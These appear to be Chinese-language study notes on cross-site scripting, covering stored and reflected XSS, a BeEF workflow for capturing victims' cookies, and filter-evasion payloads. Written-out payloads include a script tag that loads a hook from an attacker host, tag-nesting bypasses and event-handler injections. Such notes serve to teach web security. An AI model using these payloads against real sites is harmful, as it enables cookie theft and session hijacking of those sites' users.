### 一、漏洞原理
攻击者利用网站对输入的过滤缺陷，传入payload,使访问改页面的浏览器产生歧义，从而达到攻击的效果
### 二、存在条件

- 网页对用户输入过滤不足
- 输入内容会在页面展示
### 三、漏洞分类

1. 存储型XSS
   1. 判定：_<script>alert(1)</script>,_如果每次刷新都会调用该脚本则为存储型XSS
   2. 攻击：
      1. 启动_beef-xss_或者其他_xss_平台，传入payload：<script src="[http://192.168.11.132:3000/hook.js"></script>](http://192.168.11.132:3000/hook.js"></script>)
      2. 在平台获取传递过来的cookie，并在xss平台进行对应的攻击
   3. 防护绕过
      1. 标签剔除：标签嵌套，比如<script>改为<scri<script>pt>,通常只对内部的标签进行过滤
      2. 正则过滤标签：使用其他标签，比如<img src='' onerror="">
2. 反射型XSS
> 攻击方式跟存储型XSS类似，但是payload无法存储入数据库，从而只能执行一次

### 四、常见payload及绕过绕过
![](https://cdn.nlark.com/yuque/0/2022/jpeg/32589116/1665667713803-1801833f-406e-4538-8251-8c903d2fc35f.jpeg)
主要要点：
> - 探测过滤 sRc DaTa OnFocus <sCriPt> <a hReF=javascript:alert()> 
> - // 注释
> - 查看源页面，根据源页面判断


### 五、总结
XSS漏洞是利用web的过滤不严谨，从而导致浏览器对html的解析产生歧义，最终导致被利用。所有的攻击方式取决于对前端三剑客以及浏览器的理解和使用。


